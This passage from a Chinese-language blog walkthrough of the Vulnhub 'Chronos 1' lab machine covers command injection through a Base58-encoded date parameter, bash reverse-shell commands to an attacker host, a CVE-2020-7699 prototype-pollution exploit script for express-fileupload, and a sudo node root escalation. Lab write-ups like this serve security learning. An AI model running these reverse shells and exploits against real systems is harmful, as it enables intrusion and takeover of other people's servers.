\u003c/span\u003e%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描出\u003ccode\u003e/Date\u003c/code\u003e和\u003ccode\u003e/date\u003c/code\u003e ，两个页面是一样的，返回以下字符\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eTypeError: Expected String\n    at decodeUnsafe (/opt/chronos/node_modules/base-x/src/index.js:\u003cspan class=\"hljs-number\"\u003e66\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e)\n    at Object.decode (/opt/chronos/node_modules/base-x/src/index.js:\u003cspan class=\"hljs-number\"\u003e113\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e)\n    at /opt/chronos/app.js:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\n    at Layer.handle [\u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e handle_request] (/opt/chronos/node_modules/express/lib/router/layer.js:\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e)\n    at \u003cspan class=\"hljs-built_in\"\u003enext\u003c/span\u003e (/opt/chronos/node_modules/express/lib/router/route.js:\u003cspan class=\"hljs-number\"\u003e137\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e)\n    at Route.dispatch (/opt/chronos/node_modules/express/lib/router/route.js:\u003cspan class=\"hljs-number\"\u003e112\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e)\n    at Layer.handle [\u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e handle_request] (/opt/chronos/node_modules/express/lib/router/layer.js:\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e)\n    at /opt/chronos/node_modules/express/lib/router/index.js:\u003cspan class=\"hljs-number\"\u003e281\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e\n    at Function.process_params (/opt/chronos/node_modules/express/lib/router/index.js:\u003cspan class=\"hljs-number\"\u003e335\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e)\n    at \u003cspan class=\"hljs-built_in\"\u003enext\u003c/span\u003e (/opt/chronos/node_modules/express/lib/router/index.js:\u003cspan class=\"hljs-number\"\u003e275\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e仔细看上面回显的报错，可以知道是\u003ccode\u003eNode.js\u003c/code\u003e ，以及\u003ccode\u003eexpress\u003c/code\u003e 一个流行的 \u003ccode\u003eNode.js Web\u003c/code\u003e 框架，可能是一个基于 \u003ccode\u003eNode.js\u003c/code\u003e 和 \u003ccode\u003eExpress.js\u003c/code\u003e 的 \u003ccode\u003eWeb\u003c/code\u003e 应用（将报错的提示直接喂给chatgpt即可）\u003c/p\u003e\n\u003cp\u003e下面是GPT的解释：\u003c/p\u003e\n\u003cp\u003e这个错误 \u003ccode\u003eTypeError: Expected String\u003c/code\u003e 通常是由于某个函数期望传入一个字符串类型的参数，但实际接收到了其他类型的数据（例如 \u003ccode\u003eundefined\u003c/code\u003e、\u003ccode\u003enull\u003c/code\u003e 或对象等）。在你遇到的情况中，问题出现在 \u003ccode\u003ebase-x\u003c/code\u003e 包的 \u003ccode\u003edecodeUnsafe\u003c/code\u003e 函数中，这个包是用来进行 base 编码（如 Base64 或 Base58）的编码和解码操作。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubChronos%201/image96.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e回到前面，我们注意到了\u003ccode\u003e80\u003c/code\u003e端口也是请求的\u003ccode\u003e8000\u003c/code\u003e端口的\u003ccode\u003e/date\u003c/code\u003e ，参数是\u003ccode\u003eformat\u003c/code\u003e ，后面跟着的应该是\u003ccode\u003eBase64\u003c/code\u003e 或 \u003ccode\u003eBase58\u003c/code\u003e ，而我们直接访问\u003ccode\u003e/date\u003c/code\u003e不加参数（\u003ccode\u003eundefined\u003c/code\u003e、\u003ccode\u003enull\u003c/code\u003e）就会造成上面的报错\u003ccode\u003eTypeError\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e复制\u003ccode\u003e80\u003c/code\u003e端口请求\u003ccode\u003e8000\u003c/code\u003e端口\u003ccode\u003e/date\u003c/code\u003e的包后面的参数进行解码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试后可得知是\u003ccode\u003eBase58\u003c/code\u003e ，解码出来是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-string\"\u003e'+Today is %A, %B %d, %Y %H:%M:%S.'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e就是\u003ccode\u003e80\u003c/code\u003e端口上的时间\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubChronos%201/image97.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们尝试将其修改为别的字符串，看看能不能修改\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e将\u003ccode\u003e'+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.'\u003c/code\u003e通过\u003ccode\u003ebase58\u003c/code\u003e编码后得到 \u003ccode\u003eDjerGPjfzgpppwBPtBUY9XHKb6yTharNX81g3tSBJ3hJdABPG8Bj1gnmwWqc\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e刷新\u003ccode\u003e80\u003c/code\u003e端口主页，抓包，修改\u003ccode\u003e/date\u003c/code\u003e后的参数为我们修改过\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubChronos%201/image98.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e修改后放行，回到浏览器查看\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubChronos%201/image99.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e是可以修改的，这里可能是突破点\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们将注意力放在\u003ccode\u003e'+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.'\u003c/code\u003e ，将其投喂给\u003ccode\u003eGPT\u003c/code\u003e后发现不是\u003ccode\u003eNode.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# GPT 原话\u003c/span\u003e\n在 Node.js 中，这样的格式化字符串一般不会直接使用像 %A、%B 这样的占位符，\n因为 JavaScript（包括 Node.js）的日期时间处理方式和其他语言（如 Python）有所不同。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后得知是\u003ccode\u003eLinux\u003c/code\u003e中的\u003ccode\u003eDate\u003c/code\u003e命令\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubChronos%201/image100.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e很难不怀疑是命令执行\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过使用\u003ccode\u003eLinux\u003c/code\u003e构造命令，然后进行编码尝试是否存在命令执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-string\"\u003e'+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.'\u003c/span\u003e | ls\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e会将前面的结果传递给后面的命令作为命令，但是\u003ccode\u003els\u003c/code\u003e不接受前面的结果，所以会直接执行\u003ccode\u003els\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e进行\u003ccode\u003eBase58\u003c/code\u003e编码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e7LpzQUvtAU8ezh7iNvMhdy7bv2ZW8RaxEkthfeUDjBN2WGYxytPqosuP9BtJfrTBUSn\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后通过上面抓包的方式将参数进行替换后\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubChronos%201/image101.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以发现将\u003ccode\u003els\u003c/code\u003e的结果打印出来了\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e尝试获得shell\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e将参数修改为反弹\u003ccode\u003eshell\u003c/code\u003e的命令（\u003ccode\u003e192.168.56.10\u003c/code\u003e是\u003ccode\u003ekali\u003c/code\u003e）\u003c/p\u003e\n\u003cp\u003ePS:突然发现较新的靶机都不能直接通过\u003ccode\u003enc\u003c/code\u003e来反弹\u003ccode\u003eshell\u003c/code\u003e，需要通过\u003ccode\u003ebash\u003c/code\u003e来反弹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-string\"\u003e'+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.'\u003c/span\u003e | bash -c \u003cspan class=\"hljs-string\"\u003e\"bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.10/1234 0\u003e\u0026#x26;1\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e编码后得到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e2XHxFqgRgHdnuw7ymykTgiqjFXsf7ew4NHNWzh32oWPcBSFmAv79MRw4ezcAFwUUe6V4GMCkMRUE7T3Lc6JBiNLaBMPiw9rTgpKdigK4HxoDBDDYcfF7bTLgcaRMj63ozzHBCUA6M\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e开启监听，然后抓包将参数替换，可以发现已经反弹成功了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~/Desktop]\n└─\u003cspan class=\"hljs-comment\"\u003e# nc -lvp 1234                                \u003c/span\u003e\nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e chronos.local [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.7\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e41632\u003c/span\u003e\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (\u003cspan class=\"hljs-number\"\u003e808\u003c/span\u003e): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nwww-data@chronos:/opt/chronos$ \nwww-data@chronos:/opt/chronos$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@chronos:/opt/chronos$ whoami\nwww-data\nwww-data@chronos:/opt/chronos$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) gid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) groups=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data)\nwww-data@chronos:/opt/chronos$ uname -a\nLinux chronos \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e151\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找突破点\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eSUID\u003c/code\u003e，无可利用\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/opt/\u003c/code\u003e下存在\u003ccode\u003echronos-v2\u003c/code\u003e文件夹（靶机下存在这些文件夹，大概是突破口了），查看其后端文件夹\u003ccode\u003e/opt/chronos-v2/backend\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e存在\u003ccode\u003eserver.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# server.js \u003c/span\u003e\nconst express = require(\u003cspan class=\"hljs-string\"\u003e'express'\u003c/span\u003e);\nconst fileupload = require(\u003cspan class=\"hljs-string\"\u003e\"express-fileupload\"\u003c/span\u003e);\nconst http = require(\u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e)\n\nconst app = express();\n\napp.use(fileupload({ parseNested: true }));\n\napp.\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'view engine'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'ejs'\u003c/span\u003e);\napp.\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'views'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"/opt/chronos-v2/frontend/pages\"\u003c/span\u003e);\n\napp.get(\u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, (req, res) =\u003e {\n   res.render(\u003cspan class=\"hljs-string\"\u003e'index'\u003c/span\u003e)\n});\n\nconst server = http.Server(app);\nconst addr = \u003cspan class=\"hljs-string\"\u003e\"127.0.0.1\"\u003c/span\u003e\nconst port = \u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e;\nserver.listen(port, addr, () =\u003e {\n   console.log(\u003cspan class=\"hljs-string\"\u003e'Server listening on '\u003c/span\u003e + addr + \u003cspan class=\"hljs-string\"\u003e' port '\u003c/span\u003e + port);\n});\nwww-data@chronos:/opt/chronos-v2/backend$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到 \u003ccode\u003eexpress-fileupload\u003c/code\u003e 存在文件上传，并开启在\u003ccode\u003e8080\u003c/code\u003e端口，因为\u003ccode\u003econst addr = \"127.0.0.1\"\u003c/code\u003e 为本地环回地址，所以只能在本机上访问到，怪不得扫描不到\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e重点是\u003ccode\u003eexpress-fileupload\u003c/code\u003e ，网上查阅其漏洞\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e可以在\u003ccode\u003epackage.json\u003c/code\u003e 下找到它的版本号\u003ccode\u003e1.1.7-alpha.3\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecat package.json\n{\n  \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"some-website\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"version\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"1.0.0\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"description\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"main\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"server.js\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"scripts\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"start\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"node server.js\"\u003c/span\u003e\n  },\n  \u003cspan class=\"hljs-string\"\u003e\"author\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"license\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"ISC\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"dependencies\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"ejs\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^3.1.5\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"express\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^4.17.1\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"express-fileupload\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^1.1.7-alpha.3\"\u003c/span\u003e\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eCVE-2020-7699\u003c/code\u003e 找到漏洞RCE\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.freebuf.com/vuls/246029.html\"\u003ehttps://www.freebuf.com/vuls/246029.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.freebuf.com/articles/web/322857.html\"\u003ehttps://www.freebuf.com/articles/web/322857.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/\"\u003ehttps://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e本菜鸡没看懂，要学习\u003ccode\u003eNode.js\u003c/code\u003e污染原型链，本菜鸡没学过，大概知道要怎么利用\u003c/p\u003e\n\u003cp\u003e大概就是将数据包里的的\u003ccode\u003ename\u003c/code\u003e改为\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-markdown\"\u003e\u003cspan class=\"hljs-strong\"\u003e__proto__\u003c/span\u003e.outputFunctionName\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后将值改为：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scss\"\u003e\u003cspan class=\"hljs-attribute\"\u003ex\u003c/span\u003e;process\u003cspan class=\"hljs-selector-class\"\u003e.mainModule\u003c/span\u003e\u003cspan class=\"hljs-selector-class\"\u003e.require\u003c/span\u003e('child_process')\u003cspan class=\"hljs-selector-class\"\u003e.exec\u003c/span\u003e('bash -c \"bash -i \u0026#x26;\u003e /dev/tcp/ip/prot \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003e\u0026#x26;\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\"');\u003cspan class=\"hljs-attribute\"\u003ex\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当我们再次发起请求时，便会在指定的主机反弹回来一个\u003ccode\u003eshell\u003c/code\u003e，从而达到RCE的目的\u003c/p\u003e\n\u003cp\u003e其实在上面的链接也给出了利用脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e requests\n\ncmd = \u003cspan class=\"hljs-string\"\u003e'bash -c \"bash -i \u0026#x26;\u003e /dev/tcp/192.168.56.10/8888 0\u003e\u0026#x26;1\"'\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# pollute\u003c/span\u003e\nrequests.post(\u003cspan class=\"hljs-string\"\u003e'http://127.0.0.1:8080'\u003c/span\u003e, files = {\u003cspan class=\"hljs-string\"\u003e'__proto__.outputFunctionName'\u003c/span\u003e: (\n    \u003cspan class=\"hljs-literal\"\u003eNone\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003ef\"x;console.log(1);process.mainModule.require('child_process').exec('\u003cspan class=\"hljs-subst\"\u003e{cmd}\u003c/span\u003e');x\"\u003c/span\u003e)})\n\n\u003cspan class=\"hljs-comment\"\u003e# execute command\u003c/span\u003e\nrequests.get(\u003cspan class=\"hljs-string\"\u003e'http://127.0.0.1:8080'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们将脚本改名为\u003ccode\u003eshell.py\u003c/code\u003e然后上传到靶机进行利用\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e存放在靶机的\u003ccode\u003e/tmp\u003c/code\u003e目录里，同时\u003ccode\u003ekali\u003c/code\u003e监听\u003ccode\u003e8888\u003c/code\u003e端口，执行脚本（使用\u003ccode\u003epython3\u003c/code\u003e执行）\u003c/p\u003e\n\u003cp\u003e可以看到已经反弹到\u003ccode\u003e8888\u003c/code\u003e端口了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubChronos%201/image102.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e用户是\u003ccode\u003eimera\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在该用户家目录下存在\u003ccode\u003eflag\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eimera@chronos:~$ cat user.txt\nbyBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eimera@chronos:/opt/chronos-v2/backend$ sudo -l\nsudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e imera on chronos:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/snap/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser imera may run the following commands on chronos:\n    (ALL) NOPASSWD: /usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/npm *\n    (ALL) NOPASSWD: /usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/node *\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e可以进行提权了\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.huangmj.com/17116743651246.html#41-sudo-node\"\u003ehttps://www.huangmj.com/17116743651246.html#41-sudo-node\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eimera@chronos:~$ sudo node -e \u003cspan class=\"hljs-string\"\u003e\"require('child_process').spawn('/bin/bash',{stdio:[0,1,2]})\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得root！！！！\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e读取\u003ccode\u003eflag\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# user.txt\u003c/span\u003e\nbyBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e难点在提权到\u003ccode\u003eimera\u003c/code\u003e用户，以及发现\u003ccode\u003eweb\u003c/code\u003e突破点的思路，还得学习Node.js的原型链污染（我还没学），最后的提权到\u003ccode\u003eroot\u003c/code\u003e也是之前没有尝试过的\u003c/p\u003e","title":"Vulnhub - Chronos 1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"},"recentPosts":[{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2
